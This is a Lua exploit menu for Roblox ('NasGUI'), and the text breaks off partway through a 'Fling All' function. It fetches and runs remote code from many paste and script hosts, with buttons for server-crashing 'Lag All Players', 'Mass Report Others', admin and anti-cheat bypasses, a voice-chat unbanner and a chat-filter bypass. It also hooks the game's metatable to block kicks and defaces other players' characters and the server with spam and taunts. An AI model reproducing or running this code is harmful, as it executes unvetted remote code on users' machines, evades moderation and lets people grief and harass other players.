-- UNIVERSAL BOM REMOVER
do
    local url = "https://raw.githubusercontent.com/realNasser9229/NasGUI/refs/heads/main/source.lua"
    local code = game:HttpGet(url, true)

    -- Strip all common BOMs
    code = code:gsub("^\239\187\191", "") -- UTF-8
    code = code:gsub("^\255\254", "")     -- UTF-16 LE
    code = code:gsub("^\254\255", "")     -- UTF-16 BE
    code = code:gsub("^\255\254\0\0", "") -- UTF-32 LE
    code = code:gsub("^\0\0\254\255", "") -- UTF-32 BE

    -- Wrap in pcall to avoid silent crashes
    local f, err = loadstring("local function init()\n"..code.."\nend\npcall(init)")
    if f then f() else warn("Failed to load NasGUI: "..err) end
end

local function init()
-- EXTREME NasGUI v2.0 REBORN MODDED INTRO WITH BLUR + GUARANTEED LOAD (UPDATED URL)
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

-- CLEANUP
if CoreGui:FindFirstChild("NasIntroV2") then
    CoreGui.NasIntroV2:Destroy()
end

local scr = Instance.new("ScreenGui")
scr.Name = "NasIntroV2"
scr.Parent = CoreGui
scr.IgnoreGuiInset = true

-- BLUR EFFECT
local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = game:GetService("Lighting")

local function fadeBlur(startSize, endSize, duration)
    task.spawn(function()
        local elapsed = 0
        while elapsed < duration do
            local delta = RunService.RenderStepped:Wait()
            elapsed = elapsed + delta
            blur.Size = startSize + (endSize - startSize) * (elapsed / duration)
        end
        blur.Size = endSize
    end)
end

-- GUI FADE FUNCTION
local function fade(obj, startT, endT, duration)
    task.spawn(function()
        local elapsed = 0
        while elapsed < duration do
            local delta = RunService.RenderStepped:Wait()
            elapsed = elapsed + delta
            local alpha = math.clamp(startT + (endT - startT) * (elapsed/duration), 0, 1)

            if obj:IsA("Frame") then
                obj.BackgroundTransparency = 1 - alpha
            elseif obj:IsA("TextLabel") then
                obj.TextTransparency = 1 - alpha
            end
        end

        if obj:IsA("Frame") then
            obj.BackgroundTransparency = 1 - endT
        elseif obj:IsA("TextLabel") then
            obj.TextTransparency = 1 - endT
        end
    end)
end

-- BACKGROUND
local bg = Instance.new("Frame", scr)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(200,0,0)
bg.BackgroundTransparency = 1
bg.BorderSizePixel = 0

local gradient = Instance.new("UIGradient", bg)
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(180,0,0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,50,50))
}
gradient.Rotation = 45

-- TEXT
local title = Instance.new("TextLabel", scr)
title.Size = UDim2.new(1,-40,0,80)
title.Position = UDim2.new(0,20,0.35,0)
title.BackgroundTransparency = 1
title.Text = "NASGUI v2.0 REBORN MODDED"
title.Font = Enum.Font.GothamBlack
title.TextSize = 40
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextTransparency = 1
title.TextScaled = true

local sub = Instance.new("TextLabel", scr)
sub.Size = UDim2.new(1,-40,0,40)
sub.Position = UDim2.new(0,20,0.5,0)
sub.BackgroundTransparency = 1
sub.Text = "UNLEASHING CHAOS..."
sub.Font = Enum.Font.GothamBold
sub.TextSize = 24
sub.TextColor3 = Color3.fromRGB(255,255,255)
sub.TextTransparency = 1
sub.TextScaled = true

-- AUDIO
local sound = Instance.new("Sound", scr)
sound.SoundId = "rbxassetid://9085309015"
sound.Volume = 1
sound:Play()

-----------------------------------------
-- INTRO SEQUENCE
-----------------------------------------

-- 1. Blur fade in
fadeBlur(0,25,0.8)
task.wait(0.8)

-- 2. Red gradient fade + text fade in
fade(bg,1,0,1.0)
fade(title,1,0,1.0)
fade(sub,1,0,1.0)
task.wait(1.0)

-- 3. Cinematic hold
task.wait(1.2)

-- 4. Fade out everything
fade(title,0,1,0.8)
fade(sub,0,1,0.8)
fade(bg,0,1,0.8)
task.wait(0.8)

-- 6. Blur fades out AFTER NasGUI is already open
task.wait(0.5)
fadeBlur(25,0,1.0)
task.wait(1.0)

-- 7. Cleanup
scr:Destroy()
blur:Destroy()

print(">> Nas9229alt's SUPER OP NasGUI V2.0 loaded successfully! GO REKT THEM NOW!!!")


-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")


-- Play startup sound
local startupSound = Instance.new("Sound", workspace)
startupSound.SoundId = "rbxassetid://9118823100"
startupSound.Volume = 4.5
startupSound:Play()


-- Billboard GUI on player head
pcall(function()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local head = char:WaitForChild("Head")
    local msg = "NasGUI V2.0 Loaded! | Made by: Nas9229alt & 1602sasa2/Jan"


    local Billboard = Instance.new("BillboardGui", head)
    Billboard.Size = UDim2.new(0, 200, 0, 50)
    Billboard.StudsOffset = Vector3.new(0, 2, 0)
    Billboard.Adornee = head
    Billboard.AlwaysOnTop = true
    Billboard.Name = "AutoChatAd"


    local text = Instance.new("TextLabel", Billboard)
    text.Size = UDim2.new(1, 0, 1, 0)
    text.BackgroundTransparency = 1
    text.TextScaled = true
    text.TextColor3 = Color3.fromRGB(255, 0, 0)
    text.Font = Enum.Font.SourceSansBold
    text.Text = msg


    task.delay(10, function()
        Billboard:Destroy()
    end)
end)


-- GUI Setup with Blackish-Red Theme
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "NasGUI"
gui.ResetOnSpawn = false


local mainFrame = Instance.new("Frame", gui)
mainFrame.Size = UDim2.new(0, 450, 0, 400) -- Compact size for luxury feel
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -200)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0) -- Blackish-red
mainFrame.BorderColor3 = Color3.fromRGB(255, 50, 50) -- Red accent
mainFrame.BorderSizePixel = 2
mainFrame.Active = true
mainFrame.Draggable = true


-- Cozy Background Image (replace with your preferred cozy image ID)
local bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.BackgroundTransparency = 1
bgImage.Image = "rbxassetid://2151741365" -- Cozy red/black abstract vibe
bgImage.ImageTransparency = 0.3
bgImage.ZIndex = 0


-- Title
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -80, 0, 30)
title.Position = UDim2.new(0, 10, 0, 5)
title.BackgroundTransparency = 1
title.Text = "NasGUI Reborn v2.0 MODDED"
title.Font = Enum.Font.GothamBlack
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(128, 0, 0)
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 1


-- Close Button
local close = Instance.new("TextButton", mainFrame)
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -40, 0, 5)
close.Text = "X"
close.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.Font = Enum.Font.GothamBold
close.TextSize = 16
close.ZIndex = 1
close.MouseButton1Click:Connect(function()
    gui:Destroy()
end)


-- Minimize and Toggle Button
local minimize = Instance.new("TextButton", mainFrame)
minimize.Size = UDim2.new(0, 30, 0, 30)
minimize.Position = UDim2.new(1, -75, 0, 5)
minimize.Text = "–"
minimize.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
minimize.Font = Enum.Font.GothamBold
minimize.TextSize = 16
minimize.ZIndex = 1


local toggle = Instance.new("ImageButton", gui)
toggle.Size = UDim2.new(0, 50, 0, 50)
toggle.Position = UDim2.new(0, 20, 0, 200)
toggle.Image = "rbxassetid://120853264656112"
toggle.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
toggle.BorderColor3 = Color3.fromRGB(255, 50, 50)
toggle.Visible = false
toggle.Draggable = true


-- Smooth animations for minimize/toggle
local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
minimize.MouseButton1Click:Connect(function()
    TweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 450, 0, 0)}):Play()
    task.wait(0.3)
    mainFrame.Visible = false
    toggle.Visible = true
end)


toggle.MouseButton1Click:Connect(function()
    mainFrame.Visible = true
    TweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 450, 0, 400)}):Play()
    toggle.Visible = false
end)


-- Tab Frame
local tabFrame = Instance.new("Frame", mainFrame)
tabFrame.Size = UDim2.new(1, -20, 0, 40)
tabFrame.Position = UDim2.new(0, 10, 0, 40)
tabFrame.BackgroundTransparency = 1
tabFrame.ZIndex = 1


-- Containers for Tabs
local containerMain = Instance.new("Frame", mainFrame)
containerMain.Size = UDim2.new(1, -20, 1, -90)
containerMain.Position = UDim2.new(0, 10, 0, 80)
containerMain.BackgroundTransparency = 1
containerMain.Visible = true
containerMain.ZIndex = 1


local containerExec = Instance.new("Frame", mainFrame)
containerExec.Size = containerMain.Size
containerExec.Position = containerMain.Position
containerExec.BackgroundTransparency = 1
containerExec.Visible = false
containerExec.ZIndex = 1


local containerMisc = Instance.new("Frame", mainFrame)
containerMisc.Size = containerMain.Size
containerMisc.Position = containerMain.Position
containerMisc.BackgroundTransparency = 1
containerMisc.Visible = false
containerMisc.ZIndex = 1


local containerClientServer = Instance.new("Frame", mainFrame)
containerClientServer.Size = containerMain.Size
containerClientServer.Position = containerMain.Position
containerClientServer.BackgroundTransparency = 1
containerClientServer.Visible = false
containerClientServer.ZIndex = 1


-- Tab Buttons
local function createTabButton(name, pos, callback)
    local b = Instance.new("TextButton", tabFrame)
    b.Size = UDim2.new(0, 100, 0, 30)
    b.Position = UDim2.new(0, pos, 0, 5)
    b.Text = name
    b.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 14
    b.ZIndex = 1
    b.MouseButton1Click:Connect(callback)
end


createTabButton("Main", 0, function()
    containerMain.Visible = true
    containerExec.Visible = false
    containerMisc.Visible = false
    containerClientServer.Visible = false
end)
createTabButton("Executor", 110, function()
    containerMain.Visible = false
    containerExec.Visible = true
    containerMisc.Visible = false
    containerClientServer.Visible = false
end)
createTabButton("Misc", 220, function()
    containerMain.Visible = false
    containerExec.Visible = false
    containerMisc.Visible = true
    containerClientServer.Visible = false
end)
createTabButton("Client-Server (WIP)", 330, function()
    containerMain.Visible = false
    containerExec.Visible = false
    containerMisc.Visible = false
    containerClientServer.Visible = true
end)


-- Main Tab ScrollingFrame
local scrollMain = Instance.new("ScrollingFrame", containerMain)
scrollMain.Size = UDim2.new(1, 0, 1, 0)
scrollMain.BackgroundTransparency = 1
scrollMain.ScrollBarThickness = 5
scrollMain.ScrollBarImageColor3 = Color3.fromRGB(102, 0, 0)
scrollMain.CanvasSize = UDim2.new(0, 0, 0, 0) -- Auto-adjusted later
scrollMain.ZIndex = 1


local mainLayout = Instance.new("UIListLayout", scrollMain)
mainLayout.Padding = UDim.new(0, 10)
mainLayout.SortOrder = Enum.SortOrder.LayoutOrder


-- Button Creation Helper
local function createButton(parent, text, y, callback)
    local btn = Instance.new("TextButton", parent)
    btn.Size = UDim2.new(1, -20, 0, 40)
    btn.Position = UDim2.new(0, 10, 0, y)
    btn.Text = text
    btn.TextSize = 14
    btn.BackgroundColor3 = Color3.fromRGB(128, 0, 0)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Gotham
    btn.ZIndex = 1
    btn.MouseButton1Click:Connect(callback)
    return btn
end


-- Main Tab Buttons
local buttons = {
    {"Set Skybox", function()
        local id = "rbxassetid://82411403129832"
        local s = Instance.new("Sky", game.Lighting)
        s.SkyboxBk = id s.SkyboxDn = id s.SkyboxFt = id
        s.SkyboxLf = id s.SkyboxRt = id s.SkyboxUp = id
    end},
    {"Play Song", function()
        local snd = Instance.new("Sound", workspace)
        snd.SoundId = "rbxassetid://114573847650036"
        snd.Looped = true snd.Volume = 10 snd.PlaybackSpeed = 0.17 snd:Play()
    end},
    {"Decal Spam", function()
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                local d = Instance.new("Decal", v)
                d.Texture = "rbxassetid://82411403129832"
            end
        end
    end},
    {"Set Particles", function()
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                local p = Instance.new("ParticleEmitter", v)
                p.Texture = "rbxassetid://82411403129832"
            end
        end
    end},
    {"ServerHint Message", function()
        local h = Instance.new("Hint", workspace)
        h.Text = "BOW DOWN TO NAS9229ALT & HAXSTER998 CUZ WE PWNED THIS GAME LOL"
    end},
    {"Nameless Admin", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))()
    end},
    {"Disco Fog", function()
        local Lighting = game:GetService("Lighting")
        if Lighting:FindFirstChild("DiscoFogConnection") then
            Lighting.DiscoFogConnection:Disconnect()
        end
        local discoConnection = RunService.RenderStepped:Connect(function()
            Lighting.FogColor = Color3.new(math.random(), math.random(), math.random())
        end)
        Lighting:SetAttribute("DiscoFogConnection", discoConnection)
    end},
    {"Btools", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Btools-41524"))()
    end},
    {"Inf Yield", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end},
    {"Jork", function()
        loadstring(game:HttpGet("https://pastefy.app/lawnvcTT/raw", true))()
    end},
    {"MrBean Jumpscare", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Mr-Bean-Jumpscare-8856"))()
    end},
    {"Skrubl0rdz Skybox", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lkidd-skybox-script-10964"))()
    end},
    {"007n7 Decal Spam", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-007n7-decal-spam-Not-FE-26963"))()
    end},
    {"Dex Explorer", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
    end},
    {"SimpleSpy", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SimpleSpy-20145"))()
    end},
    {"FE Invisible", function()
        loadstring(game:HttpGet("https://pastefy.app/mjkbQzXk/raw"))()
    end},
    {"Fly Tool", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Tool-34005"))()
    end},
    {"Freaky Ahh Messages", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Freaky-ahh-quotes-by-me-43270"))()
    end},
    {"Fake R6 FE", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/R6.txt"))()
    end},
    {"Chat Logger", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Chat-Logger-24902"))()
    end},
    {"Anti-Chat Logger", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/qjDfA6E5"))()
    end},
    {"ESP Tracers", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Exunys-ESP-7126"))()
    end},
    {"FE Goofy Animations", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/UQhaBfEZ"))()
    end},
    {"Lag All Players", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-TOOL-SERVER-CRASHER-30316"))()
    end},
    {"R6 Animations GUI", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/aqua-hub-is-a-skid-lol/refs/heads/main/animatrix"))()
    end},
    {"OP Sword Tool", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Linked-Sword-R6-Script-40329"))()
    end},
    {"FE KJ", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-Temu-KJ-IMPROVED-19618"))()
    end},
    {"Auto Heal", function()
        spawn(function()
            while task.wait(1) do
                local player = game.Players.LocalPlayer
                if player.Character and player.Character:FindFirstChild("Humanoid") then
                    player.Character.Humanoid.Health = player.Character.Humanoid.MaxHealth
                end
            end
        end)
    end},
    {"R6 Dances FE", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-EPIK-R6-DANCEZZ-43816"))()
    end},
    {"Arceus X Aimbot", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Arceus-X-Aimbot-13242"))()
    end},
    {"Billboard GUI", function()
        local billboard = Instance.new("BillboardGui")
        billboard.Adornee = game.Players.LocalPlayer.Character:FindFirstChild("Head")
        billboard.Size = UDim2.new(0, 200, 0, 50)
        billboard.StudsOffset = Vector3.new(0, 2, 0)
        billboard.AlwaysOnTop = true
        billboard.Parent = game.Players.LocalPlayer.Character.Head


        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = "HAXSTER998"
        label.TextColor3 = Color3.new(1, 0, 0)
        label.TextScaled = true
        label.Font = Enum.Font.SourceSansBold
        label.Parent = billboard
    end},
    {"c00lclan v2", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lclan-v2-52915"))()
    end},
    {"FE Collection", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/sypcerr/FECollection/refs/heads/main/script.lua", true))()
    end},
    {"FE John Doe", function()
        loadstring(game:HttpGet('https://pastebin.com/raw/sB9Wwx9v', true))()
    end},
    {"Billboard Others", function()
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                if head:FindFirstChild("NasSlaveBillboard") then
                    head.NasSlaveBillboard:Destroy()
                end
                local billboard = Instance.new("BillboardGui")
                billboard.Name = "NasSlaveBillboard"
                billboard.Size = UDim2.new(0, 200, 0, 50)
                billboard.StudsOffset = Vector3.new(0, 2, 0)
                billboard.Adornee = head
                billboard.AlwaysOnTop = true
                billboard.Parent = head
                local label = Instance.new("TextLabel", billboard)
                label.Size = UDim2.new(1, 0, 1, 0)
                label.BackgroundTransparency = 1
                label.Text = "Nas' Slave"
                label.TextColor3 = Color3.fromRGB(255, 255, 255)
                label.TextScaled = true
                label.Font = Enum.Font.SourceSansBold
            end
        end
    end},
    {"Nas' Trail", function()
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")
        if hrp:FindFirstChild("NasTrailAttachment0") then
            for _, obj in pairs(hrp:GetChildren()) do
                if obj:IsA("Trail") or obj:IsA("Attachment") then
                    obj:Destroy()
                end
            end
        end
        local att0 = Instance.new("Attachment")
        att0.Name = "NasTrailAttachment0"
        att0.Position = Vector3.new(0, 1, 0)
        att0.Parent = hrp
        local att1 = Instance.new("Attachment")
        att1.Name = "NasTrailAttachment1"
        att1.Position = Vector3.new(0, -1, 0)
        att1.Parent = hrp
        local trail = Instance.new("Trail")
        trail.Attachment0 = att0
        trail.Attachment1 = att1
        trail.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 0))
        }
        trail.Lifetime = 1
        trail.MinLength = 0.1
        trail.LightEmission = 1
        trail.WidthScale = NumberSequence.new(0.5)
        trail.Parent = hrp
    end},
    {"Become Nas9229alt", function()
        local userId = 3902404879
        local success, asset = pcall(function()
            return game:GetService("InsertService"):LoadAsset(userId)
        end)
        if success and asset then
            local clone = asset:FindFirstChildWhichIsA("Model")
            if clone then
                clone.Parent = workspace
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local hrp = LocalPlayer.Character.HumanoidRootPart
                    clone:SetPrimaryPartCFrame(hrp.CFrame)
                end
                LocalPlayer.Character:Destroy()
                LocalPlayer.Character = clone
            else
                warn("No model found in asset.")
            end
        else
            warn("Failed to load Nas9229alt model: "..tostring(asset))
        end
    end},
    {"Create Team", function()
        local Teams = game:GetService("Teams")
        local teamName = "TEAM NAS9229ALT JOIN TODAY!"
        local team = Teams:FindFirstChild(teamName)
        if not team then
            team = Instance.new("Team")
            team.Name = teamName
            team.TeamColor = BrickColor.new("Bright red")
            team.AutoAssignable = false
            team.Parent = Teams
        end
        local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
        if not leaderstats then
            leaderstats = Instance.new("Folder")
            leaderstats.Name = "leaderstats"
            leaderstats.Parent = LocalPlayer
        end
        local teamStat = leaderstats:FindFirstChild("Team")
        if not teamStat then
            teamStat = Instance.new("StringValue")
            teamStat.Name = "Team"
            teamStat.Value = team.Name
            teamStat.Parent = leaderstats
        else
            teamStat.Value = team.Name
        end
        LocalPlayer.Team = team
    end},
    {"Universal Anti-Kick (FE)", function()
    -- Protects you from being kicked by the server
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)


    mt.__namecall = newcclosure(function(self, ...)
        local args = {...}
        local method = getnamecallmethod()


        -- Block any attempt to kick the local player
        if method == "Kick" and self == game.Players.LocalPlayer then
            warn("Blocked a kick attempt!")
            return
        end


        return oldNamecall(self, ...)
    end)


    setreadonly(mt, true)


    -- Extra protection: detect scripts that try to destroy character
    local player = game.Players.LocalPlayer
    if player.Character then
        player.Character:GetPropertyChangedSignal("Parent"):Connect(function()
            if not player.Character.Parent then
                warn("Attempted to remove character! Re-parenting...")
                player.Character.Parent = workspace
            end
        end)
    end
end},
    {"Mass Report Others", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Mass-Report-Others-42251"))()
    end},
    {"Grab Unanchored Parts", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-grab-unanchored-blocks-42313"))()
    end},
    {"FE Boogie Down", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-boogie-down-53232"))()
    end},
    {"FE Chat Bypass", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-chisis-byp*s-54088"))()
    end},
    {"Remote-Abuse Admin", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-remote-abuse-FE-admin-script-27923"))()
    end},
    {"Prizz Admin", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-Prizz-Admin-14511"))()
    end},
    {"VC Unbanner", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Voice-Chat-Unban-42843"))()
    end},
    {"SaveInstance V2", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universally-saveinstance-V2-42081"))()
    end},
    {"Roblox Emotes & Animations", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))()
    end},
    {"Modified Ring Parts", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Super-modified-ring-parts-55157"))()
    end},
    {"FE NPC Control", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Control-script-Credits-to-patrick-34156"))()
    end},
    {"FE Sword Tool", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Classic-Sword-Fling-Tool-16842"))()
    end},
    {"Monster Mash", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Monster-Mash-Tool-Script-24283"))()
    end},
    {"RemoteSpy V3", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RemoteSpy-v3-33731"))()
    end},
    {"Mobile Shiftlock", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shiftlock-For-Mobile-Script-36530"))()
    end},
    {"Adonis Bypass", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-adonis-admin-bypass-19375"))()
    end},
    {"FE Omni-Man", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Omniman-49493"))()
    end},
    {"Retro Animations R6", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Classic-Animations-2971"))()
    end},
    {"Delta UI", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-delta-executor-ui-but-its-a-script-52949"))()
    end},
    {"Private Chat", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-a-secretive-Fe-chat-for-communication-without-filtering-49526"))()
    end},
    
    {"FE Hug R6", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-hug-script-v1-33471"))()
    end},


    {"FilteringEnabled Status", function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-checker-41897"))()
    end},
    {"Client-Side AK-47", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-EPIC-FE-AK47-5040"))()
end},
{"Backflip", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Backflip-Script-18595"))()
end},
{"Spin Skybox", function()
    local RunService = game:GetService("RunService")
    local lighting = game:GetService("Lighting")

    -- Find the Sky object
    local sky = lighting:FindFirstChildOfClass("Sky")
    if not sky then
        warn("Sky object not found under Lighting")
        return
    end

    -- Speed in degrees per second (adjust as needed)
    local speed = 360 * 1000000 -- 10 full rotations per second

    -- Spin loop
    RunService.RenderStepped:Connect(function(dt)
        local current = sky.SkyboxOrientation
        local newX = (current.X + speed * dt) % 360
        sky.SkyboxOrientation = Vector3.new(newX, current.Y, current.Z)
    end)
end},
{"Nas9229alt Punch Tool", function()
    -- Punch fling by Nas9229alt
    loadstring(game:HttpGet("https://pastefy.app/nZEjE2JU/raw?part=Punch%20Fling%20by%20Nas9229alt.lua"))()
end},
{"ESP", function()
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local LocalPlayer = Players.LocalPlayer

    -- Function to add highlight
    local function createHighlight(parent, color)
        local existing = parent:FindFirstChild("NasESPHighlight")
        if existing then
            existing:Destroy()
        end
        local highlight = Instance.new("Highlight")
        highlight.Name = "NasESPHighlight"
        highlight.FillColor = color
        highlight.OutlineColor = color
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.Adornee = parent
        highlight.Parent = parent
    end

    -- Track players
    local function updatePlayerESP(player)
        if player == LocalPlayer then return end
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            createHighlight(player.Character, Color3.fromRGB(255,0,0)) -- red
        end
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("HumanoidRootPart")
            createHighlight(char, Color3.fromRGB(255,0,0))
        end)
    end

    for _, player in pairs(Players:GetPlayers()) do
        updatePlayerESP(player)
    end

    Players.PlayerAdded:Connect(updatePlayerESP)

    -- Track NPCs (anything in Workspace with Humanoid but not a player)
    local function updateNPCESP(npc)
        if npc:IsA("Model") and npc:FindFirstChild("Humanoid") and not Players:GetPlayerFromCharacter(npc) then
            createHighlight(npc, Color3.fromRGB(0,0,255)) -- blue
        end
    end

    for _, obj in pairs(Workspace:GetDescendants()) do
        updateNPCESP(obj)
    end

    Workspace.DescendantAdded:Connect(updateNPCESP)

    print("[ESP] Active: Players=Red, NPCs=Blue")
end},
{"Friends ESP", function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local function createHighlight(character, color)
        local existing = character:FindFirstChild("NasFriendsESP")
        if existing then existing:Destroy() end
        local highlight = Instance.new("Highlight")
        highlight.Name = "NasFriendsESP"
        highlight.FillColor = color
        highlight.OutlineColor = color
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.Adornee = character
        highlight.Parent = character
    end

    local function applyToPlayer(player)
        if player == LocalPlayer then return end
        if not LocalPlayer:IsFriendsWith(player.UserId) then return end
        if player.Character then
            createHighlight(player.Character, Color3.fromRGB(255,255,0)) -- yellow
        end
        player.CharacterAdded:Connect(function(char)
            createHighlight(char, Color3.fromRGB(255,255,0))
        end)
    end

    for _, player in pairs(Players:GetPlayers()) do
        applyToPlayer(player)
    end

    Players.PlayerAdded:Connect(function(player)
        applyToPlayer(player)
    end)

    print("[Friends ESP] Active: highlighting all friends in yellow")
end},
{"View RCCService", function()
    local CoreGui = game:GetService("CoreGui")
    local Workspace = game:GetService("Workspace")

    -- Try to get RCCService (dummy / client-side)
    local success, RCC = pcall(function()
        return getmetatable(game) and game:FindFirstChild("RCCService") or nil
    end)
    
    -- Create local mimicker table
    local RCCMimic = {}
    if success and RCC then
        for k,v in pairs(RCC:GetChildren()) do
            RCCMimic[k] = v
        end
        print("[RCCService Mimic] Loaded properties:")
        for k,v in pairs(RCCMimic) do
            print(k,v)
        end
    else
        print("[RCCService Mimic] RCCService not found, creating empty mimicker.")
    end

    -- GUI to view (and optionally edit) properties
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "RCCMimicGUI"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 300, 0, 400)
    frame.Position = UDim2.new(0, 10, 0, 10)
    frame.BackgroundTransparency = 0.15

    local list = Instance.new("ScrollingFrame", frame)
    list.Size = UDim2.new(1,-10,1,-10)
    list.Position = UDim2.new(0,5,0,5)
    list.CanvasSize = UDim2.new(0,0,2,0)

    local layout = Instance.new("UIListLayout", list)
    layout.Padding = UDim.new(0,2)

    for k,v in pairs(RCCMimic) do
        local item = Instance.new("TextBox", list)
        item.Size = UDim2.new(1,-10,0,25)
        item.Text = k.." : "..tostring(v)
        item.ClearTextOnFocus = false
        item.FocusLost:Connect(function(enter)
            if enter then
                RCCMimic[k] = item.Text
                print("[RCC Mimic] Local value changed:", k, "=", item.Text)
            end
        end)
    end

    print("[RCCService Viewer] GUI ready. You can view or locally edit mimicked values.")
end},
{"Fling All", function()
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
